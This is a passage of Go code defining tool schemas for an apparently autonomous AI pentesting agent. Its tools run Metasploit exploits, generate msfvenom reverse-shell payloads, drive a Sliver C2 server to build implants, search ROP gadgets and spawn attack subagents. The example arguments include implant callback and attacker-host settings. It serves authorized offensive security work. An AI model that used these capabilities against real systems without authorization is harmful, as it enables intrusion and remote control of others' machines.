				Description: openai.String("Run symbolic execution on a binary to find a path to a specific address, optionally avoiding another. Good for finding inputs to reach win functions."),
				Parameters: openai.FunctionParameters{
					"type": "object",
					"properties": map[string]interface{}{
						"binary_path": map[string]interface{}{"type": "string", "description": "Path to binary"},
						"find_addr":   map[string]interface{}{"type": "string", "description": "Address to find (e.g., '0x401234' or symbol name if resolved)"},
						"avoid_addr":  map[string]interface{}{"type": "string", "description": "Address to avoid (optional)"},
					},
					"required": []string{"binary_path", "find_addr"},
				},
			},
		},
		{
			Type: "function",
			Function: openai.FunctionDefinitionParam{
				Name:        "run_ropper",
				Description: openai.String("Search for ROP gadgets in a binary. Use search parameter for specific gadgets like 'pop rdi; ret'."),
				Parameters: openai.FunctionParameters{
					"type": "object",
					"properties": map[string]interface{}{
						"binary_path": map[string]interface{}{"type": "string", "description": "Path to binary"},
						"search":      map[string]interface{}{"type": "string", "description": "Specific gadget to search for (optional)"},
					},
					"required": []string{"binary_path"},
				},
			},
		},
		{
			Type: "function",
			Function: openai.FunctionDefinitionParam{
				Name:        "run_one_gadget",
				Description: openai.String("Find one-gadget RCE shortcuts in a libc.so binary."),
				Parameters: openai.FunctionParameters{
					"type": "object",
					"properties": map[string]interface{}{
						"libc_path": map[string]interface{}{"type": "string", "description": "Path to libc.so"},
					},
					"required": []string{"libc_path"},
				},
			},
		},
		{
			Type: "function",
			Function: openai.FunctionDefinitionParam{
				Name:        "run_pwntools",
				Description: openai.String("Write and execute a custom pwntools Python script. Use this to run your final exploits."),
				Parameters: openai.FunctionParameters{
					"type": "object",
					"properties": map[string]interface{}{
						"script": map[string]interface{}{"type": "string", "description": "The complete Python script contents"},
					},
					"required": []string{"script"},
				},
			},
		},
		{
			Type: "function",
			Function: openai.FunctionDefinitionParam{
				Name:        "run_volatility3",
				Description: openai.String("Run memory forensics on a dump file. Specify the OS-appropriate plugin (windows.pslist, linux.bash, mac.lsof)."),
				Parameters: openai.FunctionParameters{
					"type": "object",
					"properties": map[string]interface{}{
						"mem_file": map[string]interface{}{"type": "string", "description": "Path to memory dump file"},
						"plugin":   map[string]interface{}{"type": "string", "description": "Volatility 3 plugin name"},
					},
					"required": []string{"mem_file", "plugin"},
				},
			},
		},
		{
			Type: "function",
			Function: openai.FunctionDefinitionParam{
				Name:        "run_prowler",
				Description: openai.String("Multi-cloud security posture scan via wrapped Prowler (aws | azure | gcp | kubernetes). Returns FAIL findings with severity, service, and resource. Absorbs Prowler's 1000+ checks without reimplementation. Pass creds_json ({\"KEY\":\"VAL\"}) for provider authentication."),
				Parameters: openai.FunctionParameters{
					"type": "object",
					"properties": map[string]interface{}{
						"provider":   map[string]interface{}{"type": "string", "description": "aws | azure | gcp | kubernetes (default: aws)"},
						"account":    map[string]interface{}{"type": "string", "description": "Account/subscription/project id (optional)"},
						"region":     map[string]interface{}{"type": "string", "description": "Region to scope the scan (optional)"},
						"creds_json": map[string]interface{}{"type": "string", "description": "JSON object of credential env vars, e.g. {\"AWS_ACCESS_KEY_ID\":\"...\",\"AWS_SECRET_ACCESS_KEY\":\"...\"}"},
					},
					"required": []string{},
				},
			},
		},
		{
			Type: "function",
			Function: openai.FunctionDefinitionParam{
				Name:        "run_attack_plan",
				Description: openai.String("Build a MITRE ATT&CK kill-chain-ordered emulation plan from the tools/techniques DrogonClaw maps. Reuses the embedded ATT&CK DB; pass tools (comma-separated) to scope the plan, or omit to use the full built-in tool set."),
				Parameters: openai.FunctionParameters{
					"type": "object",
					"properties": map[string]interface{}{
						"tools": map[string]interface{}{"type": "string", "description": "Optional comma-separated tool/action names to include (e.g. 'nmap_scan,metasploit,kerberoasting'). Omit for the full set."},
					},
					"required": []string{},
				},
			},
		},
		{
			Type: "function",
			Function: openai.FunctionDefinitionParam{
				Name:        "run_sliver",
				Description: openai.String("Drive the operator's own Sliver C2 server (orchestration only). Runs a sliver subcommand against the operator-controlled Sliver instance — e.g. generate an implant, start a listener, or list sessions. For authorized engagements; Sliver must be installed in the sandbox."),
				Parameters: openai.FunctionParameters{
					"type": "object",
					"properties": map[string]interface{}{
						"subcommand": map[string]interface{}{"type": "string", "description": "sliver subcommand (e.g. generate, listener, sessions, use)"},
						"args":       map[string]interface{}{"type": "string", "description": "Arguments for the subcommand (e.g. '--os windows --http 10.0.0.5 --save /tmp/implant')"},
					},
					"required": []string{"subcommand"},
				},
			},
		},
		{
			Type: "function",
			Function: openai.FunctionDefinitionParam{
				Name:        "run_metasploit",
				Description: openai.String("Execute a Metasploit Framework module (exploit, auxiliary, post) via msfconsole against a target."),
				Parameters: openai.FunctionParameters{
					"type": "object",
					"properties": map[string]interface{}{
						"module":  map[string]interface{}{"type": "string", "description": "Metasploit module path (e.g. 'exploit/multi/http/maradb_rce', 'auxiliary/scanner/http/http_version')"},
						"options": map[string]interface{}{"type": "string", "description": "Semicolon-separated msfconsole option sets (e.g. 'set RHOSTS 192.168.1.10; set RPORT 80; set TARGETURI /')"},
					},
					"required": []string{"module"},
				},
			},
		},
		{
			Type: "function",
			Function: openai.FunctionDefinitionParam{
				Name:        "run_msfvenom",
				Description: openai.String("Generate a reverse shell or standalone payload using MSFVenom."),
				Parameters: openai.FunctionParameters{
					"type": "object",
					"properties": map[string]interface{}{
						"payload":     map[string]interface{}{"type": "string", "description": "Metasploit payload name (e.g. 'linux/x64/meterpreter/reverse_tcp', 'windows/x64/meterpreter/reverse_tcp')"},
						"lhost":       map[string]interface{}{"type": "string", "description": "Attacker IP address for reverse connection"},
						"lport":       map[string]interface{}{"type": "string", "description": "Attacker listening port"},
						"format":      map[string]interface{}{"type": "string", "description": "Output format: elf, exe, raw, python, c (default: elf)"},
						"output_file": map[string]interface{}{"type": "string", "description": "Destination file path in workspace (default: /tmp/payload.<format>)"},
					},
					"required": []string{"payload", "lhost", "lport"},
				},
			},
		},
		{
			Type: "function",
			Function: openai.FunctionDefinitionParam{
				Name:        "spawn_subagent",
				Description: openai.String("Spawns an isolated subagent for a specialized pentesting workstream (recon, web audit, vulnerability research, code audit, or exploit writing) with zero context-cost turns."),
				Parameters: openai.FunctionParameters{
					"type": "object",
					"properties": map[string]interface{}{
						"name":       map[string]interface{}{"type": "string", "description": "Human-readable subagent name e.g. 'Web Recon Subagent', 'Code Auditor'"},
						"agent_type": map[string]interface{}{"type": "string", "description": "recon | web | exploit | code | general"},
						"prompt":     map[string]interface{}{"type": "string", "description": "Detailed instructions and objective for the subagent"},
						"target":     map[string]interface{}{"type": "string", "description": "Target domain, IP, URL, or file path"},
					},
					"required": []string{"name", "prompt"},
				},
			},
		},
		{
			Type: "function",
			Function: openai.FunctionDefinitionParam{
				Name:        "run_parallel_subagents",
				Description: openai.String("Executes multiple independent pentesting subagents or tool tasks concurrently in parallel workstreams. Dramatically accelerates recon, multi-port fuzzing, and vulnerability scanning."),
				Parameters: openai.FunctionParameters{
					"type": "object",
					"properties": map[string]interface{}{
						"target": map[string]interface{}{"type": "string", "description": "Target domain or IP (if running preset parallel recon)"},
						"tasks": map[string]interface{}{
							"type":        "array",
							"description": "List of subagent tasks to execute in parallel",
							"items": map[string]interface{}{
								"type": "object",
								"properties": map[string]interface{}{
									"id":         map[string]interface{}{"type": "string", "description": "Unique task ID e.g. 'task_1'"},
									"name":       map[string]interface{}{"type": "string", "description": "Task label e.g. 'Nmap Port Scan'"},
									"tool":       map[string]interface{}{"type": "string", "description": "Tool name e.g. 'run_nmap', 'run_httpx', 'run_gobuster'"},
									"context":    map[string]interface{}{"type": "string", "description": "Instructions for the subagent task"},
									"args":       map[string]interface{}{"type": "object", "description": "Arguments object for the tool"},
									"depends_on": map[string]interface{}{"type": "array", "items": map[string]interface{}{"type": "string"}, "description": "Task IDs that must finish before this task runs"},
								},
								"required": []string{"id", "name"},
							},
						},
					},
				},
			},
		},
	}
}
